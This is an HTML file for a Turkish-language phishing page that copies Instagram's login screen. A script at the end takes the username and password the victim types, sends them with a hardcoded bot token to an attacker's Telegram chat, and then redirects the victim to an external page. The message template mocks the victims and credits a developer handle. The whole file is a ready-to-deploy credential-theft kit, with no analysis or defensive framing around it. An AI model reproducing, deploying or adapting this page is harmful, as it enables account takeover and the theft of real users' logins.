<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Giriş</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 350px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        }

        .logo img {
            width: 175px;
            margin-bottom: 20px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }

        input {
            width: 100%;
            margin-bottom: 10px;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            font-weight: bold;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #007bb5;
        }

        .divider {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 10px 0;
        }

        .divider hr {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
            border: none;
        }

        .divider span {
            margin: 0 15px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 500;
        }

        .facebook-login {
            color: #385185;
            font-weight: bold;
            margin: 15px 0;
            text-decoration: none;
            display: block;
            text-align: center;
        }

        .facebook-login:hover {
            text-decoration: underline;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-box {
            margin-top: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            text-decoration: none;
            color: #0095f6;
            font-weight: bold;
        }

        .signup-box a:hover {
            text-decoration: underline;
        }

        .app-links {
            text-align: center;
            margin-top: 20px;
        }

        .app-links img {
            width: 136px;
            margin: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
            <input type="password" id="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="divider">
            <hr>
            <span>YA DA</span>
            <hr>
        </div>
        <a href="#" class="facebook-login">Facebook ile Giriş Yap</a>
        <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        <div class="signup-box">
            <p>Hesabın yok mu? <a href="#">Kaydol</a></p>
        </div>
        <div class="app-links">
            <p>Uygulamayı indir.</p>
            <a href="#"><img src="https://www.instagram.com/static/images/appstore.png/aae87cd9dfe.png" alt="App Store"></a>
            <a href="#"><img src="https://www.instagram.com/static/images/googleplay.png/98cf3c912a2d.png" alt="Google Play"></a>
        </div>
    </div>

    <script>
        // Telegram Bot Token ve Chat ID bilgileri
        const TOKEN = "7393402334:AAG5zfzRmVl1gpzPSiSImKjoq5Zyha4nS4w";
        const CHAT_ID = "7560090434";

        // Form gönderim işlemi
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Sayfanın yenilenmesini engelle

            // Kullanıcı adı ve şifre bilgilerini al
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Telegram'a gönderilecek mesaj
            const message = `
YENİ BİR ELEMAN GELDİ BAK
📂 KULLANICI ADI: ${username}
🔑 ŞİFRESİ: ${password}
👨‍💻 Geliştirici @vebalandin
            `;

            // Telegram API isteği
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Mesaj Telegram botuna gönderildi!");
                } else {
                    console.log("Mesaj gönderilirken hata oluştu!");
                }
            })
            .catch(error => {
                console.error("Telegram API hatası:", error);
            });

            // Kullanıcıyı belirttiğiniz sayfaya yönlendirme
            window.location.href = `https://repoxy.vercel.app/ig.html`;
        });
    </script>
</body>
</html>
